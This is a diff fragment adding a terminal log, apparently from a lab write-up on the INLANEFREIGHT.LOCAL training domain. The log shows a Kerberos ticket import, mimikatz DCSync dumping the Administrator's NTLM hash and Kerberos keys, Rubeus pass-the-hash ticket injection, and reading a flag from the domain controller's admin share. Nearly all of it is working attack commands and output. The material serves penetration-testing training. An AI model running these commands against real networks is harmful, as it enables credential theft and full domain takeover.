+      QzP0fnvJGnC0TRRCuWWBdfR8Y+CAWvKGxNPj3n2ECG+z/6JTrmkgiB5scGU7le68VRsZNjegZC/k4epi
+      ODg/WY7VL7fknFHmWA8QekPqUJSNMWmRyL1tvS0gKPfJHMO/WIm+cWiCIoE5934Bn5ZOWiTSqdyOccPs
+      6rvNGHq8Q+QYTvcXq/DL0O2xCse4Od5pXFVGH3wYdOBaCfyjkTwFSzynQjNrt5dvEK1vtN2jy9fP8rD3
+      h51LDQG4/DZyLlU7PUuCa3FJ0aAIhocmrX9EBuGV7xX/FxqEcbghZCjFpdyLhEXF0Blys7ppf0/vT62D
+      vyi1Sl1vOJMh7hERItdn6ZDlS/ZLD7kPYqfFGh5cZLjW9TNz1Wy3fQ0UY0FcLEreHfM+VsBO2qOB+DCB
+      9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEIGgIagXXIulhoL56WQ22Z7N4J4rW
+      qLntdkTgzYABflSfoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUA
+      YKEAAKURGA8yMDI0MDkwNDE0MjA1NlqmERgPMjAyNDA5MDUwMDIwNTZapxEYDzIwMjQwOTExMTQwODEw
+      WqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hU
+      LkxPQ0FM
+[+] Ticket successfully imported!
+PS C:\Tools> .\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # lsadump::dcsync /user:Administrator
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'Administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 10/19/2022 3:42:15 AM
+Object Security ID   : S-1-5-21-1870146311-1183348186-593267556-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: a83b750679b1789e29e966d06c7e41f7
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : c0c314620e831f51d2e70c8bbcf467d0
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 63c66123844eb389d84ba45ce22a1049616c9575ba1db00ee7296f756f5efd83
+      aes128_hmac       (4096) : 14dcfebbfdff3600c11212b2fdbcfbee
+      des_cbc_md5       (4096) : 51f1a19b4ace5b98
+    OldCredentials
+      aes256_hmac       (4096) : c061ecce3c5065cb8fa5a318f87043fcda393e5847cd60c5b577c792abe4b1cf
+      aes128_hmac       (4096) : cae406f8ce064461c3d052bee571b22a
+      des_cbc_md5       (4096) : dce90843451cd5d9
+    OlderCredentials
+      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
+      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
+      des_cbc_md5       (4096) : 9876615285c2766e
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 51f1a19b4ace5b98
+    OldCredentials
+      des_cbc_md5       : dce90843451cd5d9
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  ab2fdc53a990e32869e8a98fc59dc206
+    02  3abca29569facfbc205683459eaece35
+    03  0e0679aecd5273af2e68d8b323aae976
+    04  ab2fdc53a990e32869e8a98fc59dc206
+    05  c9919f1a836e7fabb18d130cec24807c
+    06  7b73d306501805583d681b925182046c
+    07  f1ccbd2394180bc5c5802995f6ba6a69
+    08  b08fc537753c5101f20b63165e280005
+    09  45986e33d4f21254afb5f7e87a39cd8d
+    10  1e102037b067dc87394511c8a3064383
+    11  b08fc537753c5101f20b63165e280005
+    12  dd78ee60caa7509ef912b5aae361f3e4
+    13  69577b907120d00bebd4b75dfda7991d
+    14  914f9c2c97f766342099756e0c1a1630
+    15  08e335a746497008039494a75c4ed639
+    16  da981c56ea848ac4776321d17e51cc44
+    17  e2a7bb20c06e2d632a8c87d6c642ad13
+    18  077e3aecbdbb74250de005297bcad363
+    19  625cf00ec72be3a3ee550babc6c01ad4
+    20  48ef0f03bbcce15c6038a8f70c294f5a
+    21  50ef9d684511c75a6e4dffae3b3ccb6c
+    22  e5bd6515c85eea79aea14180e9c1c874
+    23  040a88fc1e0241e581efc2fa7905a277
+    24  694b699679cc1b5fb29f8d94c80e3081
+    25  e36606074f573fb29d38e9fca76aed42
+    26  6f7d7d09a921775625b065070e5ffd06
+    27  2e94f912d99837fdbfa8fbab930636ff
+    28  693252322e42b9cc9fec8a962d351f54
+    29  1e14b5ecaacafdb74ac49712c20c8da5
 
 
+mimikatz #
+mimikatz #
+PS C:\Tools> .\Rubeus.exe asktgt /rc4:a83b750679b1789e29e966d06c7e41f7 /user:Administrator /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: a83b750679b1789e29e966d06c7e41f7
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\Administrator'
+[*] Using domain controller: 172.16.99.3:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGFjCCBhKgAwIBBaEDAgEWooIFETCCBQ1hggUJMIIFBaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggS7MIIEt6ADAgESoQMC
+      AQKiggSpBIIEpVpBLEu95w7GhjTt+fAURjed5edGzVZ309n+CkryrJvEKGr/PM7zjwKu5FSKMYPi/6h5
+      Duk6fnzhBxngY+0UT0hGapguI49dDj8wT2wto3iBAGS+thQtz7bXAfT/rvwdZdJFYiY0Z+U+fbrfsNeY
+      IN4eSdqx1NaFH9+J8Qz2BFvXJ8cvb3HdwVhK0RAec+bLyen2jwM9/gjmW65lI1lHsAGN6My3Jj/vm6Gq
+      GFUyNnBKY7CkPvPj+4lMGke6HBVbJBO9oQOUqNUQ7l2ttk4Rxy9E309zStGPYTEs0QIDpC2kQGjXH6hI
+      vE29vifuXO+aea1vdJAc04jWSEzoItJniWFc9qY6Wa0sBMVEHQoMbXYxqXspE6cWn9bi90yZ5+IxUrBo
+      C8NRRgTfh3jxlDWhP5h9TR0TfPua+OeICa8O3z8lq9KV2hB+pzxRku9IoZyzTAbs1NMceQHA0X73zlVg
+      yUXkXQ2g2fzS0sq6mGr8tI90kYbR9FknZbv7NweABVcgB7ComkZaHqacc+jLZRT0syB3yaEHEYFOSbzV
+      nvcuSweuXpLx84VBll40j6qDeOoytUnhxNm5tXfqVS2zMVG5H/DjFLDbeeAEHK9TiAJKB04s12+wqqcO
+      KvH/PHmgoEqj5MWzEPfQ0o//iaXRxkSh+TMQpU7PWsSN9rv23q6u52i5gt+k7H6FW+G+e1jXzj1b5446
+      w81y8ufqaLPGXhxk3T4ndoyuNW0IKhhMjql81ZbGg+YPigJ4zEB8zGcgzRMSo/r8KGXA4kvO81RFnddP
+      YZiuX/u0GkthFCjphge6Z0CyczEL2C5VRle/jV5djJk2RdQulNP5rve0DMOFmlNLwsDIcm2K0x1emJXE
+      C8gutnWeLtZVWyD0hIlDwSe6faUae8rWfieRwlR1PeS3rokBHPSZerZD/A8t7ZU4bD95WQTtIm97GBw5
+      LIIjyxCL2ZtwPQYifGEGz9QsiQ36EcqS2F5fJPqc1rdHMvDBMUdvuGhSUecfD3poNcAlFtKNaZLw4Un7
+      iAVpsbdW9Z3Gt+WL8nVdTZIHdLElrp5HPUpAEviAc/tIVXkInG1+fiy00jqrhVXhDjVr4UYRhVyhoMK0
+      b0FeLaFH43Pj/5a7U/QbkLs420bUrd0od5p3zcfTyDvv6AoNS6uyFFhSk23HdHX/5qiSnyLHm5KJoX3U
+      SjjMKbvbVqlDR1A+8QglLw+J84ggQCqWBKb/ZdV+UraoGk9IKxWpNSmFBf0FwaxiHFUfB6x5GPKc/AQG
+      kzK2fmrjIUov1+7+qjgO/1kng0IJEW6EiaGQViwB0A2ovDnPQgFZ8WSaa0AcTjOKydKrXrxypvDr3NhQ
+      TCpuDKz+1EJnafrACb4EzBQg3Tbt9xipnaI0oo4nvHjREhyZp875T7HFWzNp5bPeB+ZfBEQzHFksLRfv
+      z3clqMidadBymnrmM7HVhzO5LBHBnQyXlWsFYrT1zLwRQUdTcKnETz0S4r2kg6OQ4FKgnZM7zH8tpbEP
+      4jQ4yRUr+DbBKeq3viipJJybG9duk9FlPqOx/fMQEWC1T6MMTRvk1WQVJ975KUKPWO3vA7+2/Tp1T2Gj
+      gfAwge2gAwIBAKKB5QSB4n2B3zCB3KCB2TCB1jCB06AbMBmgAwIBF6ESBBDNT3iM1Ef53aDflHZdnF9B
+      oRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAA
+      pREYDzIwMjQwOTA0MTQyMjUyWqYRGA8yMDI0MDkwNTAwMjI1MlqnERgPMjAyNDA5MTExNDIyNTJaqBUb
+      E0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9D
+      QUw=
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
+  ServiceRealm             :  INLANEFREIGHT.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  INLANEFREIGHT.LOCAL
+  StartTime                :  9/4/2024 9:22:52 AM
+  EndTime                  :  9/4/2024 7:22:52 PM
+  RenewTill                :  9/11/2024 9:22:52 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  zU94jNRH+d2g35R2XZxfQQ==
+  ASREP (key)              :  A83B750679B1789E29E966D06C7E41F7
+
+PS C:\Tools> Get-Content \\DC01\C$\Unconstrained\flag.txt
+```
 
